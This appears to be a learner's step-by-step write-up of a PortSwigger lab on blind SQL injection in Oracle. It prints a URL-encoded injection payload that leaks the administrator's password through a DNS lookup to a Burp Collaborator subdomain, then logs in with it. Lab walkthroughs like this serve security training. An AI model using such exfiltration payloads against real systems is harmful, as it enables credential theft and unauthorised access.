https://portswigger.net/web-security/sql-injection/blind/lab-out-of-band-data-exfiltration

Lab objective: log in as the `administrator` user.

The database contains a different table called `users`, with columns called `username` and `password`. You need to exploit the blind SQL injection vulnerability to find out the password of the `administrator` user.

# Lab: Blind SQL injection with out-of-band data exfiltration

1. From lab 16 we know this lab is Oracle lab. So we will go to the `cheat-sheet` and go to the `DNS lookup with data exfiltration` and take Oracle payload and that is `SELECT EXTRACTVALUE(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://'||(SELECT YOUR-QUERY-HERE)||'.BURP-COLLABORATOR-SUBDOMAIN/"> %remote;]>'),'/l') FROM dual`
2. Open burp-suit `Collaborator` tab and click `Copy to clipboard` button. This will give you a unique subdomain. My subdomain is `usq6c7axj5wmu5p5e4z5fn748vem2cq1.oastify.com`
3. We need password so we will replace `SELECT YOUR-QUERY-HERE` by `SELECT password FROM users WHERE username='administrator'`
4. Because it is a union base attack so you need to add `UNION` first and at last you should URL encode the payload so my payload is `TrackingId=7ko6rYL2nIuXXLua'+UNION+SELECT+EXTRACTVALUE(xmltype('<%3fxml+version%3d"1.0"+encoding%3d"UTF-8"%3f><!DOCTYPE+root+[+<!ENTITY+%25+remote+SYSTEM+"http%3a//'||(SELECT+password+FROM+users+WHERE+username%3d'administrator')||'.aycmingdpl220lvlkk5ll3dkebk48uwj.oastify.com/">+%25remote%3b]>'),'/l')+FROM+dual--`
5. Then click `Pull now` from the `Collaborator` tab.
6. Then we will see in DNS type The Collaborator server received a DNS lookup of type A for the domain name **2ee77ynwsyut6tkuaheb.aycmingdpl220lvlkk5ll3dkebk48uwj.oastify.com**.
7. Here before the first dot is our password and that is `2ee77ynwsyut6tkuaheb`
8. Now login with user name and password.